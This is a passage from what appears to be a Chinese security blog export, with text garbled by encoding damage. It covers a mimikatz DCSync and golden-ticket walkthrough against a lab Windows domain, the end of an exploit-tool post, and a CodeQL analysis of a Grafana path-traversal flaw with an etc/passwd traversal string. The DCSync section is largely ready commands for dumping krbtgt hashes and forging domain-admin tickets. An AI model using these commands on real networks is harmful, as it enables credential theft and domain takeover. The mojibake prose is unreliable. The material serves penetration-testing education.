<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFXå·¥å…·æ–°å¢æ¼æ´ç¼–å†™æ•™ç¨‹</a></p>
<h4 id="3-4-éƒ¨ç½²ï¼Œå‘å¸ƒ"><a href="#3-4-éƒ¨ç½²ï¼Œå‘å¸ƒ" class="headerlink" title="3.4 éƒ¨ç½²ï¼Œå‘å¸ƒ"></a>3.4 éƒ¨ç½²ï¼Œå‘å¸ƒ</h4><p>å½“ä¸€åˆ‡ç¼–å†™å®Œæˆï¼Œbugä¿®å¤å®Œæ¯•ï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œ <strong>mvn package assembly:single</strong> å³å¯ç”Ÿæˆ <strong>jar</strong> æ–‡ä»¶ã€‚</p>
<p>è¿è¡Œä½¿ç”¨<strong>targetç›®å½•ä¸‹æœ€å¤§çš„jaræ–‡ä»¶</strong> </p>
<p>å¯¹æ–¹æ²¡æœ‰Javaç¯å¢ƒæ€ä¹ˆåŠï¼Ÿ</p>
<p>ä½¿ç”¨ <strong>mvn jfx:native</strong> å‘½ä»¤ç”Ÿäº§å¯¹åº”å¹³å°çš„æ–‡ä»¶ï¼Œæ¯”å¦‚Macä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤<strong>mvn jfx:native</strong>å‘½ä»¤å°±ä¼šåœ¨ <strong>target&#x2F;jfx&#x2F;native</strong> ç›®å½•ä¸‹ç”Ÿæˆæ‰“åŒ…ååº”ç”¨(winä¸‹ç”Ÿæˆexe)ï¼Œå¸¦å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¸¦ JRE è¿è¡Œç¯å¢ƒï¼Œè¶…å¤§ï¼Œ200+Mã€‚</p>
<p> <strong>mvn clean</strong>ç”¨äºæ¸…é™¤ç”Ÿæˆçš„æ–‡ä»¶ã€‚</p>
<h2 id="0x05-å…è´£å£°æ˜"><a href="#0x05-å…è´£å£°æ˜" class="headerlink" title="0x05 å…è´£å£°æ˜"></a>0x05 å…è´£å£°æ˜</h2><p>æœ¬å·¥å…·ä»…èƒ½åœ¨å–å¾—è¶³å¤Ÿåˆæ³•æˆæƒçš„ä¼ä¸šå®‰å…¨å»ºè®¾ä¸­ä½¿ç”¨ï¼Œåœ¨ä½¿ç”¨æœ¬å·¥å…·è¿‡ç¨‹ä¸­ï¼Œæ‚¨åº”ç¡®ä¿è‡ªå·±æ‰€æœ‰è¡Œä¸ºç¬¦åˆå½“åœ°çš„æ³•å¾‹æ³•è§„ã€‚</p>
<p>å¦‚æ‚¨åœ¨ä½¿ç”¨æœ¬å·¥å…·çš„è¿‡ç¨‹ä¸­å­˜åœ¨ä»»ä½•éæ³•è¡Œä¸ºï¼Œæ‚¨å°†è‡ªè¡Œæ‰¿æ‹…æ‰€æœ‰åæœï¼Œæœ¬å·¥å…·æ‰€æœ‰å¼€å‘è€…å’Œæ‰€æœ‰è´¡çŒ®è€…ä¸æ‰¿æ‹…ä»»ä½•æ³•å¾‹åŠè¿å¸¦è´£ä»»ã€‚</p>
<p>é™¤éæ‚¨å·²å……åˆ†é˜…è¯»ã€å®Œå…¨ç†è§£å¹¶æ¥å—æœ¬åè®®æ‰€æœ‰æ¡æ¬¾ï¼Œå¦åˆ™ï¼Œè¯·æ‚¨ä¸è¦å®‰è£…å¹¶ä½¿ç”¨æœ¬å·¥å…·ã€‚</p>
<p>æ‚¨çš„ä½¿ç”¨è¡Œä¸ºæˆ–è€…æ‚¨ä»¥å…¶ä»–ä»»ä½•æ˜ç¤ºæˆ–è€…é»˜ç¤ºæ–¹å¼è¡¨ç¤ºæ¥å—æœ¬åè®®çš„ï¼Œå³è§†ä¸ºæ‚¨å·²é˜…è¯»å¹¶åŒæ„æœ¬åè®®çš„çº¦æŸã€‚</p>
<h2 id="å¼€å¿ƒæŒ‡æ•°"><a href="#å¼€å¿ƒæŒ‡æ•°" class="headerlink" title="å¼€å¿ƒæŒ‡æ•°"></a>å¼€å¿ƒæŒ‡æ•°</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
]]></content>
      <categories>
        <category>GitHubå·¥å…·</category>
      </categories>
      <tags>
        <tag>GitHubå·¥å…·</tag>
      </tags>
  </entry>
  <entry>
    <title>åŸŸæ¸—é€-DCSyncå’Œé»„é‡‘ç¥¨æ®</title>
    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
    <content><![CDATA[<blockquote>
<p>  æ–°å¹´å¼€å·¥å¿«ä¹ï½ï½ï½</p>
</blockquote>
<h1 id="åŸŸæ¸—é€-DCSyncå’Œé»„é‡‘ç¥¨æ®"><a href="#åŸŸæ¸—é€-DCSyncå’Œé»„é‡‘ç¥¨æ®" class="headerlink" title="åŸŸæ¸—é€-DCSyncå’Œé»„é‡‘ç¥¨æ®"></a>åŸŸæ¸—é€-DCSyncå’Œé»„é‡‘ç¥¨æ®</h1><h2 id="0x01-æ¦‚è¿°"><a href="#0x01-æ¦‚è¿°" class="headerlink" title="0x01 æ¦‚è¿°"></a>0x01 æ¦‚è¿°</h2><blockquote>
<p>krbtgtè´¦æˆ·ï¼šæ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ªâ€krbtgtâ€çš„ç”¨æˆ·è´¦æˆ·ï¼Œæ˜¯KDCçš„æœåŠ¡è´¦æˆ·ï¼Œç”¨æ¥åˆ›å»ºç¥¨æ®æˆäºˆæœåŠ¡ï¼ˆTGSï¼‰  åŠ å¯†çš„å¯†é’¥ã€‚</p>
<p>é»„é‡‘ç¥¨æ®ï¼ˆGolden Ticketï¼‰ï¼šå®ƒèƒ½è®©é»‘å®¢åœ¨æ‹¥æœ‰æ™®é€šåŸŸç”¨æˆ·æƒé™å’Œkrbtgt hashçš„æƒ…å†µä¸‹ï¼Œè·å–åŸŸç®¡ç†å‘˜æƒé™ã€‚</p>
<p>DCSyncï¼šmimikatzä¸­çš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿæ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨å¹¶ä»åŸŸæ§åˆ¶å™¨å¯¼å‡ºå¸æˆ·å¯†ç hashã€‚</p>
</blockquote>
<p>åœ¨åŸŸå†…ï¼Œä¸åŒDCä¹‹é—´ï¼Œæ¯15åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€æ¬¡åŸŸæ•°æ®çš„åŒæ­¥ã€‚å®ç°ä¸ç™»å½•åˆ°åŸŸæ§åˆ¶å™¨ä¸Šï¼Œè€Œè·å–åŸŸæ§åˆ¶å™¨æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p>
<p>åœ¨DCSyncåŠŸèƒ½å‡ºç°ä¹‹å‰ï¼Œè¦æƒ³è·å¾—åŸŸç”¨æˆ·çš„å“ˆå¸Œï¼Œéœ€è¦ç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œåœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»£ç æ‰èƒ½è·å¾—åŸŸç”¨æˆ·çš„å“ˆå¸Œã€‚2015å¹´8æœˆï¼Œæ–°ç‰ˆçš„mimikatzå¢åŠ äº†DCSyncçš„åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯ä»¥æ¨¡ä»¿ä¸€ä¸ªåŸŸæ§DCï¼Œä»çœŸå®çš„åŸŸæ§ä¸­è¯·æ±‚æ•°æ®ï¼Œå¦‚ç”¨æˆ·çš„å“ˆå¸Œã€‚è¯¥åŠŸèƒ½æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯åœ¨äºä¸ç”¨ç™»é™†åŸŸæœåŠ¡å™¨ï¼Œå³å¯è¿œç¨‹é€šè¿‡åŸŸæ•°æ®åŒæ­¥å¤åˆ¶çš„æ–¹å¼è·å¾—æƒ³è¦çš„ç”¨æˆ·å£ä»¤ä¿¡æ¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒDCSyncæ”»å‡»çš„å¯¹è±¡å¦‚æœæ˜¯åªè¯»åŸŸæ§åˆ¶å™¨(RODC)ï¼Œåˆ™ä¼šå¤±æ•ˆï¼Œå› ä¸ºRODCæ˜¯ä¸èƒ½å‚ä¸å¤åˆ¶åŒæ­¥æ•°æ®åˆ°å…¶ä»–DCçš„ã€‚ </p>
<p>DCSyncçš„åŸç†éå¸¸æ¸…æ™°ï¼Œåˆ©ç”¨åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶ï¼š</p>
<ul>
<li><p>å‘ç°ç½‘ç»œä¸­çš„ç›®æ ‡åŸŸæ§åˆ¶å™¨</p>
</li>
<li><p>é€šè¿‡DRSæœåŠ¡çš„GetNCChangesæ¥å£å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼ŒDirectory Replication Serviceï¼ˆDRSï¼‰Remote Protocol</p>
<blockquote>
<p>GetNCChangesï¼šå½“ä¸€ä¸ªDCï¼ˆæˆä¸ºå®¢æˆ·ç«¯DCï¼‰æƒ³ä»å…¶ä»–DCï¼ˆæˆä¸ºæœåŠ¡ç«¯DCï¼‰è·å–æ•°æ®æ—¶ï¼Œå®¢æˆ·ç«¯DCä¼šå‘æœåŠ¡ç«¯DCå‘èµ·ä¸€ä¸ªGetNCChangesè¯·æ±‚ã€‚å›åº”çš„æ•°æ®åŒ…æ‹¬éœ€è¦åŒæ­¥çš„æ•°æ®ã€‚å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œæ¯•ç«Ÿæ¯æ¬¡å›åº”çš„æ•°æ®æœ‰é™ã€‚</p>
</blockquote>
</li>
</ul>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰å’ŒDomain Controllerså’ŒEnterprise Domain Adminsæƒé™èƒ½å¤Ÿä½¿ç”¨DCSyncï¼Œä½†æˆ‘ä»¬å¯ä»¥å¯¹åŸŸå†…æ™®é€šç”¨æˆ·æ·»åŠ ACL(Access Control List)å®ç°æ™®é€šç”¨æˆ·è°ƒç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashã€‚</p>
<h2 id="0x02-åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…ç”¨æˆ·Hash"><a href="#0x02-åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…ç”¨æˆ·Hash" class="headerlink" title="0x02 åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…ç”¨æˆ·Hash"></a>0x02 åˆ©ç”¨DCSyncå¯¼å‡ºåŸŸå†…ç”¨æˆ·Hash</h2><h4 id="åˆ©ç”¨æ¡ä»¶ï¼šè·å¾—ä»¥ä¸‹ä»»ä¸€çš„æƒé™"><a href="#åˆ©ç”¨æ¡ä»¶ï¼šè·å¾—ä»¥ä¸‹ä»»ä¸€çš„æƒé™" class="headerlink" title="åˆ©ç”¨æ¡ä»¶ï¼šè·å¾—ä»¥ä¸‹ä»»ä¸€çš„æƒé™"></a>åˆ©ç”¨æ¡ä»¶ï¼šè·å¾—ä»¥ä¸‹ä»»ä¸€çš„æƒé™</h4><ul>
<li>Administratorsç»„å†…çš„ç”¨æˆ·</li>
<li>Domain Adminsç»„å†…çš„ç”¨æˆ·</li>
<li>Enterprise Adminsç»„å†…çš„ç”¨æˆ·</li>
<li>åŸŸæ§åˆ¶å™¨çš„è®¡ç®—æœºå¸æˆ·</li>
</ul>
<h4 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h4><p>åˆ©ç”¨DRS(Directory Replication Service)åè®®é€šè¿‡IDL_DRSGetNCChangesä»åŸŸæ§åˆ¶å™¨å¤åˆ¶ç”¨æˆ·å‡­æ®ã€‚</p>
<p>è·å–ç›¸åº”æƒé™å(è¿™é‡Œå®éªŒçš„æ˜¯åŸŸå†…æœºå™¨win7ï¼ŒåŸŸæ§ä¸ºwin8ä¸Šï¼Œç™»å½•çš„åŸŸå†…ç”¨æˆ·yhy)</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224807.png" alt="image-20210221165619981"></p>
<h4 id="ä½¿ç”¨mimikatzå¯¼å‡ºæŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯-åŒ…æ‹¬å“ˆå¸Œ"><a href="#ä½¿ç”¨mimikatzå¯¼å‡ºæŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯-åŒ…æ‹¬å“ˆå¸Œ" class="headerlink" title="ä½¿ç”¨mimikatzå¯¼å‡ºæŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œ)"></a>ä½¿ç”¨<code>mimikatz</code>å¯¼å‡ºæŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œ)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator /csv</span><br><span class="line">lsadump::dcsync /domain:test.yhy /user:administrator</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224813.png" alt="image-20210221171218395"></p>
<p>è·å¾—äº†åŸŸå†…ç”¨æˆ·çš„hashåï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">å“ˆå¸Œä¼ é€’æ”»å‡»</a></p>
<h2 id="0x03ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œè·å–åŸŸç®¡ç†æƒé™"><a href="#0x03ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œè·å–åŸŸç®¡ç†æƒé™" class="headerlink" title="0x03ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œè·å–åŸŸç®¡ç†æƒé™"></a>0x03ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œè·å–åŸŸç®¡ç†æƒé™</h2><p>è·å–<code>krbtgt</code>ï¼ˆåŸŸå†…é»˜è®¤åˆ›å»ºçš„è´¦å·ï¼‰è´¦æˆ·Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.yhy /user:krbtgt /csv</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224823.png" alt="image-20210221223933475"></p>
<p>ç”Ÿæˆé»„é‡‘ç¥¨æ®ï¼Œå¹¶ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 /admin:administrator /domain:test.yhy /sid:S-1-5-21-2604854395-1602356619-879117556-502 /ticket:administrator.ticket.bin</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.ticket.bin</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224829.png" alt="image-20210221223253549"></p>
<p>æå‡åˆ°åŸŸç®¡ç†æƒé™æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224837.png" alt="image-20210221223505092"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210221224841.png" alt="image-20210221223535054"></p>
<h2 id="0x04-é˜²å¾¡"><a href="#0x04-é˜²å¾¡" class="headerlink" title="0x04 é˜²å¾¡"></a>0x04 é˜²å¾¡</h2><p>DCSyncæ”»å‡»çš„åŸç†æ˜¯æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨å‘èµ·æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶ã€‚æœ€å¥½çš„é˜²å¾¡æ–¹æ³•æ˜¯ç»™æ§åˆ¶å™¨è®¾ç½®ç™½åå•ï¼Œåœ¨åŸŸå†…ï¼ŒåŸŸæ§åˆ¶å™¨çš„æ•°é‡ã€IPåœ°å€ã€MACåœ°å€æ˜¯éå¸¸æ˜ç¡®æ¸…æ™°çš„èµ„äº§ï¼Œå°†è¿™äº›èµ„äº§è®¾ç½®åœ¨å…è®¸åŒæ­¥çš„ç™½åå•å†…ã€‚éç™½åå•çš„IPä¸å…è®¸å‘ç”Ÿæ•°æ®åŒæ­¥ã€‚</p>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ˆ - Codeql è‡ªåŠ¨è¿è¡Œå’Œé¡¹ç›®ç›‘æ§å·¥å…·</title>
    <url>/2022/12/27/%E5%BC%88%20-%20Codeql%20%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E9%A1%B9%E7%9B%AE%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»£ç å®¡è®¡æ€»æ˜¯ç¦»ä¸å¼€ä¸€äº›ç¥å™¨ï¼Œç¬”è€…å¸¸ç”¨ <a href="https://github.com/github/codeql-cli-binaries">Codeql</a> è¿™æ¬¾å·¥å…·è¾…åŠ©æŒ–æ´ã€‚å½“æˆ‘æ¯å†™ä¸€ä¸ªè§„åˆ™éƒ½éœ€è¦å¯¹å…¶å®ƒé¡¹ç›®æ‰‹åŠ¨è¿è¡Œæ£€æŸ¥ä¸€éï¼Œæ•ˆç‡å¾ˆä½ï¼Œå†åŠ ä¸Š <a href="lgtm.com/">lgtm</a> çš„å…³é—­ï¼Œæ­¤é¡¹ç›®è¯ç”Ÿäº† â€” <a href="https://github.com/ZhuriLab/Yi">å¼ˆ(Yi)</a> </p>
<h1 id="CVE-2021-43798"><a href="#CVE-2021-43798" class="headerlink" title="CVE-2021-43798"></a>CVE-2021-43798</h1><p>è¿™é‡Œä»¥ Graana çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ä¸¾ä¾‹è¯´æ˜ä½¿ç”¨æ–¹æ³•(åˆå­¦ Codeql,å¦‚æœ‰é”™è¯¯ä¹‹å¤„ï¼Œè½»ç‚¹å–·)</p>
<p>è¯¥æ¼æ´ç‰ˆæœ¬ä¸º 8.0.0 - 8.3.0 ,  ä¿®å¤ç‰ˆæœ¬ä¸º 8.3.1, 8.2.7, 8.1.8, 8.0.7</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/grafana/grafana</span><br><span class="line">git checkout v8.2.6</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ¼æ´å‘ç”Ÿåœ¨ <code>/public/plugins/:pluginId/*</code> api ä¸­ï¼Œå½“è¾“å…¥çš„ <code>pluginId</code>å­˜åœ¨æ—¶ï¼Œä¼šåŒ¹é…<code>*</code>å†…å®¹ï¼Œä½¿ç”¨<code>filepath.Clean</code>æ¸…ç†è·¯å¾„ä¸­çš„å¤šä½™å­—ç¬¦åï¼Œç›´æ¥æ‹¼æ¥åˆ°<code>pluginFilePath</code>,ç„¶åä½¿ç”¨<code>os.open(pluginFilePath)</code>æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œæœ€ç»ˆå›æ˜¾åˆ°é¡µé¢ã€‚è€Œä¸”<code>plugins api</code>æƒé™ä¸º<code>public</code>ï¼Œæ˜¯æœªæˆæƒçš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥æŸ¥çœ‹ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528623.png" alt="image-20221212154042195"></p>
<blockquote>
<p>fmt.Println(filepath.Clean(â€œ.&#x2F;â€¦&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdâ€))</p>
<p>è¾“å‡ºï¼š..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd åªæ¸…é™¤äº†å‰é¢çš„.&#x2F;â€¦&#x2F;..&#x2F;</p>
</blockquote>
<h2 id="Codeqlåˆ†æ"><a href="#Codeqlåˆ†æ" class="headerlink" title="Codeqlåˆ†æ"></a>Codeqlåˆ†æ</h2><p>ç”Ÿæˆ codeql æ•°æ®åº“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">codeql database create /Users/yhy/CodeQL/database/go/grafana/v8.2.6 -s ./ --language=go</span><br></pre></td></tr></table></figure>

<h3 id="sink"><a href="#sink" class="headerlink" title="sink"></a>sink</h3><p><code>os.open()</code>,è¿™ä¸ªæ˜¾è€Œæ˜“è§</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">go</span></span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class Sink extends DataFlow::Node &#123;</span><br><span class="line">	Sink() &#123;</span><br><span class="line">		exists(</span><br><span class="line">			DataFlow::CallNode call |</span><br><span class="line">			call.getTarget().hasQualifiedName(<span class="string">&quot;os&quot;</span>, <span class="string">&quot;Open&quot;</span>) |</span><br><span class="line">			call.getArgument(<span class="number">0</span>) = this <span class="comment">// æ ‡è®° sink ä¸º os.Open ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">		)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528751.png" alt="image-20221212161954374"></p>
<h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>æˆ‘å°† <code>Source</code> ç‚¹å®šåœ¨äº†<code>macaron.Params()</code>å‡½æ•°</p>
<p>ç½‘ä¸Šçš„æ–‡ç« éƒ½æ˜¯ä»¥<code>github.com/grafana/grafana/pkg/api/routing.RouteRegister</code>ä½œä¸ºèµ·å§‹ç‚¹ï¼Œè¿™å°±å¯¼è‡´ä¸€ä¸ªé—®é¢˜ï¼Œå†™å®Œçš„è§„åˆ™åªå¯¹<code>grafana</code>é¡¹ç›®èµ·ä½œç”¨ï¼Œä¸é€šç”¨ã€‚</p>
<p>ä»”ç»†ç ”ç©¶ä¼šå‘ç°ï¼Œ<code>RouteRegister</code>çš„å®ç°æ˜¯ä»¥<code>gopkg.in/macaron.v1</code>æ¡†æ¶ä¸ºåŸºç¡€çš„ï¼Œä½†æ˜¯å®˜æ–¹çš„<code>go/ql/lib/semmle/go/frameworks/Macaron.qll</code>ï¼Œåªæ˜¯å®ç°äº†ä¸€ä¸ªé‡å®šå‘ç›¸å…³çš„æ£€æµ‹è§„åˆ™ï¼Œemmm,åªèƒ½è‡ªå·±åŠ¨æ‰‹å†™äº†ã€‚</p>
<p>å†™ç€å†™ç€å¿½ç„¶å‘ç°ï¼Œæ€ä¹ˆä¹Ÿè·å–ä¸åˆ°<code>macaron.Params</code>, å»çœ‹ <a href="https://github.com/go-macaron/macaron">macaron</a> æºç æ‰å‘ç°ï¼Œè¿™ä¸ªå‡½æ•°å°±æ ¹æœ¬æ²¡æœ‰ï¼Œæ˜¯<code>Grafana</code>è‡ªå·±å®ç°çš„ã€‚æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹è¿™ä¸ª <code>Params</code> å‡½æ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528067.png" alt="image-20221212214825612"></p>
<p>å…¶å®å°±æ˜¯è·å–<code>net/http</code>ä¸­<code>Request.Context</code>çš„å€¼ï¼Œè€Œå‚æ•°<code>r</code>ï¼Œåˆæ˜¯é€šè¿‡<code>pkg/macaron/context.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528784.png" alt="image-20221212215137241"></p>
<p>ä¹Ÿå°±æ˜¯ <a href="https://github.com/go-macaron/macaron">macaron</a> æ¡†æ¶ä¸­çš„<code>Context</code>ç»“æ„ä½“ä¸­çš„<code>Req</code>æˆå‘˜ï¼Œè¿™ä¸ª<code>Req</code>å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„<strong>Source</strong>ç‚¹ã€‚</p>
<p>ä¿®æ”¹<code>go/ql/lib/semmle/go/frameworks/Macaron.qll</code>æ–‡ä»¶ï¼ŒåŠ å…¥å¦‚ä¸‹ä»£ç </p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line"> private class UserControlledRequestField extends UntrustedFlowSource::Range, DataFlow::FieldReadNode &#123;</span><br><span class="line"> UserControlledRequestField() &#123;</span><br><span class="line">   exists(<span class="built_in">string</span> fieldName | this.getField().hasQualifiedName(<span class="string">&quot;gopkg.in/macaron.v1&quot;</span>, <span class="string">&quot;Context&quot;</span>, fieldName) | </span><br><span class="line">fieldName = <span class="string">&quot;Req&quot;</span></span><br><span class="line">       )</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>å•ç‹¬æ‰§è¡Œï¼Œå¯ä»¥æ‰¾åˆ°æ±¡æŸ“ç‚¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202301041528810.png" alt="image-20221212220032453"></p>
<p>ç›´æ¥å°† sinkã€source æ‹¼æ¥è·‘ï¼Œå¹¶æ²¡æœ‰å‡ºç»“æœï¼Œå› æ­¤éœ€è¦ä¸€äº›å¤„ç†æ¥è¿æ¥æ•°æ®æµ</p>
<h3 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h3><p>è¿™é‡Œ <a href="https://tyskill.github.io/posts/codeql-grafana/#%E5%AE%9E%E8%B7%B5grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">tyskill</a> å¸ˆå‚…è¯´çš„å¾ˆè¯¦ç»†ï¼Œå¼•ç”¨ä¸€ä¸‹</p>
<ol>
<li><p>é™åˆ¶å‡½æ•°ä¸ºParams</p>
</li>
<li><p>å‡½æ•°å¯è¢«æ±¡æŸ“å°±è¯´æ˜å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå°±è®©predèŠ‚ç‚¹ä½œä¸ºå‚æ•°</p>
</li>
<li><p>SimpleAssignStmtç»“æ„è¡¨ç¤ºä¸€ä¸ªèµ‹å€¼è¡¨è¾¾å¼ï¼Œå¦‚<code>a+=b</code>ï¼ŒRhsè¡¨ç¤ºç­‰å·å³è¾¹ï¼Œé€šè¿‡æŸ¥çœ‹æºç å¯çŸ¥Paramså‡½æ•°è°ƒç”¨å‡ ä¹éƒ½æ˜¯åœ¨ç­‰å·å³è¾¹ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¯¥ç»“æ„å‡å°‘è¯¯æŠ¥</p>
</li>
<li><p>æœ€åå°†è¾“å‡ºèŠ‚ç‚¹è¿æ¥åˆ°èµ‹å€¼è¡¨è¾¾å¼</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(</span><br><span class="line">        CallExpr call, SimpleAssignStmt sas |</span><br><span class="line">        <span class="comment">// call.getTarget().getName() = &quot;Params&quot; and</span></span><br><span class="line">		<span class="comment">// é™åˆ¶ä¸º Params å‡½æ•°ä¼šäº§ç”Ÿå±€é™æ€§ï¼Œå»é™¤</span></span><br><span class="line">        call.getAnArgument() = pred.asExpr() <span class="built_in">and</span></span><br><span class="line">        sas.getRhs().getAChild() = call.getParent*().getAChild() <span class="built_in">and</span></span><br><span class="line">        <span class="comment">// ä½¿ç”¨getParent*()æ˜¯å› ä¸ºç­‰å·å³è¾¹ä¸æ­¢æœ‰å…‰ç§ƒç§ƒçš„Paramsæ–¹æ³•è°ƒç”¨ï¼Œå¦‚æ¼æ´ç‚¹å°±å­˜åœ¨Jionå‡½æ•°æ‹¼æ¥æ“ä½œï¼Œéœ€è¦é€šè¿‡ä¼ é€’é—­åŒ…getParent*()æ¥è·å–å®Œæ•´è¡¨è¾¾å¼</span></span><br><span class="line">        <span class="comment">// ä½¿ç”¨getAChild()åˆ™æ˜¯è¦è·å–Paramsçš„æ–¹æ³•è°ƒç”¨ï¼Œä¸è¿‡æµ‹è¯•å‘ç°ç”¨ä¸ç”¨æ•ˆæœå·®ä¸å¤šï¼Œæ‰€ä»¥ä¹Ÿä¸æ‡‚ä¸ºä»€ä¹ˆè¿˜è¦åŠ è¿™ä¸ª</span></span><br><span class="line">        sas.getRhs() = succ.asExpr()</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸå‘ç°è¯¥æ¼æ´</p>
</li>
</ol>
